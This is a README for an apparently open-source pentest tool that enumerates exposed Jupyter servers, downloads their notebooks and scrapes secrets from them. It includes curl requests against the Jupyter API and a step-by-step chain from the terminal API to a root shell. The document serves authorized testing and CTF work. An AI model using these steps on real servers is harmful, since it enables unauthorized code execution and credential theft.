# jupyter-enum 🔬

> **Jupyter Notebook Enumeration & Recon Tool for Pentesters**
> Built for authorized red team engagements and CTF labs.
> Made by **Aryan Giri**

---

Jupyter instances are increasingly common in AI/ML infrastructure — and frequently left **misconfigured or unauthenticated**. An exposed Jupyter server is a direct path to **remote code execution** via the kernel or terminal API.

`jupyter-enum` automates the full reconnaissance phase against Jupyter Notebook and JupyterLab instances, from version fingerprinting to notebook exfiltration and secret scraping.

---

## Features

| # | Module | Endpoint(s) | What it finds |
|---|---|---|---|
| 1 | Access Check | `/api`, `/tree`, `/lab` | Unauthenticated access, version, server headers |
| 2 | File & Notebook Tree | `/api/contents` | Recursive listing of all notebooks and files |
| 3 | Notebook Accessibility | `/api/contents/<path>` | Per-notebook auth bypass check |
| 4 | Active Sessions | `/api/sessions` | Which notebooks are open + kernel IDs |
| 5 | Running Kernels | `/api/kernels` | Live kernels, names, execution state |
| 6 | Terminal Access | `/api/terminals` | **RCE vector** — spawns a shell via WebSocket |
| 7 | Kernel Specs | `/api/kernelspecs` | Language, env names, conda/venv paths |
| 8 | Config Exposure | `/api/config/*` | Auth settings, allow_origin, server config |
| 9 | Swagger Docs | `/api/swagger.json` | Full API surface disclosure |
| 10 | Token Patterns | `/login`, `?token=` URL | Token leakage in HTML body and URL parameters |
| 11 | Recent Activity | `/api/contents` | Last-modified sort — identifies active notebooks |
| 12 | Secret Scraper | local `.ipynb` cells | Greps for API keys, passwords, AWS keys, private keys |
| 13 | Download (tokenless) | `/api/contents/<path>` | Full notebook exfiltration, no token needed on open servers |
| 14 | JSON Report | local | Full findings report saved to output directory |

---

## Installation

```bash
git clone https://github.com/aryangiri/jupyter-enum
cd jupyter-enum
pip install -r requirements.txt
```

**Python 3.8+ required.**

---

## Usage

### One-shot full enumeration (recommended starting point)

```bash
python3 jupyter_enum.py -t http://10.10.45.20:8888 --check-all
```

### With an auth token

```bash
python3 jupyter_enum.py -t http://10.10.45.20:8888 --token abc123def456 --check-all
```

### Download all notebooks (no token needed on open servers)

```bash
python3 jupyter_enum.py -t http://10.10.45.20:8888 --download-all
```

### Download a specific notebook

```bash
python3 jupyter_enum.py -t http://10.10.45.20:8888 --download "research/model_train.ipynb"
```

### RCE surface only (terminals + kernels)

```bash
python3 jupyter_enum.py -t http://10.10.45.20:8888 --check-terminals --enum-kernels
```

### Route through Burp Suite

```bash
python3 jupyter_enum.py -t http://10.10.45.20:8888 --proxy http://127.0.0.1:8080 --check-all
```

---

## All Flags

```
  -t, --target           Target URL (e.g. http://10.10.45.20:8888)
  --token                Auth token  [optional — not needed on open servers]
  --timeout              Request timeout in seconds (default: 10)
  --proxy                HTTP proxy (e.g. http://127.0.0.1:8080)
  --output-dir           Output directory for downloads and report (default: jupyter_loot)
  --no-banner            Suppress banner

  --check-all            Run every module in sequence (recommended)
  --enum-contents        Recursively list all files and notebooks
  --check-notebooks      Test accessibility of each discovered notebook
  --enum-sessions        List active notebook sessions
  --enum-kernels         List running kernels and their state
  --check-terminals      Check terminal (RCE) endpoint
  --enum-kernelspecs     List available kernel specs (language/env disclosure)
  --check-config         Check config API endpoints for exposure
  --check-swagger        Check for swagger/API docs exposure
  --check-tokens         Check for token leakage in HTML and URL params
  --recent-activity      Sort notebooks by last modified timestamp
  --download-all         Download all discovered notebooks
  --download NB_PATH     Download a specific notebook by path
  --no-scrape            Skip secret scraping on downloaded notebooks
```

---

## Output

```
jupyter_loot/
├── research/
│   └── model_train.ipynb        ← downloaded, mirrors remote structure
├── work/
│   └── data_pipeline.ipynb
└── enum_report.json             ← full JSON findings report
```

**enum_report.json** includes: target, version, auth status, counts, all findings with severity ratings, any leaked tokens or scraped secrets, and a timestamp.

---

## The RCE Chain (Terminal API)

If `/api/terminals` is accessible, the path to shell is:

```
1. POST /api/terminals
   ← {"name": "1"}

2. Connect WebSocket:
   ws://TARGET:8888/terminals/websocket/1

3. Send:  ["stdin", "id\n"]
   Recv:  ["stdout", "uid=0(root) gid=0(root) groups=0(root)\n"]
```

`jupyter-enum` detects and flags this — execution is left to the operator.

---

## Jupyter API Quick Reference

```bash
# Server version
curl http://TARGET:8888/api

# List all files (root)
curl http://TARGET:8888/api/contents

# List specific directory
curl http://TARGET:8888/api/contents/work

# Download notebook content
curl http://TARGET:8888/api/contents/work/model.ipynb

# Active sessions
curl http://TARGET:8888/api/sessions

# Running kernels
curl http://TARGET:8888/api/kernels

# Terminal list
curl http://TARGET:8888/api/terminals

# Kernel specs
curl http://TARGET:8888/api/kernelspecs

# With token
curl -H "Authorization: token <TOKEN>" http://TARGET:8888/api/contents
```

---

## Why Jupyter is a High-Value Target

- Commonly deployed in internal AI/ML infra with auth **disabled by default** in older versions
- Notebooks routinely contain **hardcoded API keys, database credentials, and cloud tokens**
- Running kernels provide **live arbitrary code execution**
- The terminal API (`/api/terminals`) is a **direct shell** if reachable
- Often runs as root in Docker containers or on cloud VMs
- Frequently appears in CTF machines — HackTheBox, TryHackMe, etc.

---

## Legal Disclaimer

This tool is intended **solely for use in authorized penetration testing engagements, CTF competitions, and controlled lab environments**. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent laws worldwide. The author accepts no liability for misuse.

---

*Made by Aryan Giri*
